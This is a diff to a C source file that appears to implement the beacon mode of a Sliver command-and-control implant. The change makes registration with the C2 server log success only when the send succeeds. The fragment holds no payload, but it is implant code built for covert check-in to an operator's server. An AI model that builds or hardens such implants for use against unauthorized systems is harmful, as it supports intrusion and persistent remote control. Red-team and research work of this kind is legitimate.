@@ -1,4 +1,4 @@
-﻿/* src/modes/beacon.c - beacon scheduler (register + periodic check-in).
+/* src/modes/beacon.c - beacon scheduler (register + periodic check-in).
  *
  * Shares everything below the link with the session scheduler: the channel
  * (mTLS + MUX/1 + yamux + signed frames), the envelope codecs, the RPC dispatch
@@ -264,6 +264,7 @@ int sliver_beacon_run(const char *argv0) {
   {
     sliver_channel_t *ch = NULL;
     char err[256];
+    int sent = -1;
     err[0] = '\0';
     if (sliver_channel_dial(cfg.url, cfg.host, cfg.port, cfg.ca_pem, cfg.cert_pem, cfg.key_pem,
                             cfg.age_private_key, cfg.server_minisign_pubkey, &ch, err,
@@ -276,13 +277,19 @@ int sliver_beacon_run(const char *argv0) {
                                         next_checkin) == 0 &&
           sliver_envelope_encode(&env, 0, SLIVER_MSG_BEACON_REGISTER, payload.data,
                                  payload.len) == 0) {
-        (void)ch->send(ch, env.data, env.len);
+        sent = ch->send(ch, env.data, env.len);
       }
       sliver_buf_free(&payload);
       sliver_buf_free(&env);
       sliver_sleep_ms(SLIVER_BEACON_GRACE_MS);
       sliver_channel_free(ch);
-      LOG_INFO("beacon: registered (%s)", id);
+      /* Only claim success when the frame actually reached the server: a channel
+       * that dials fine but cannot transmit must not look like a registration. */
+      if (sent == 0) {
+        LOG_INFO("beacon: registered (%s)", id);
+      } else {
+        LOG_WARN("beacon: register send failed (%s)", cfg.url);
+      }
     } else {
       LOG_WARN("beacon: register failed: %s", err);
     }
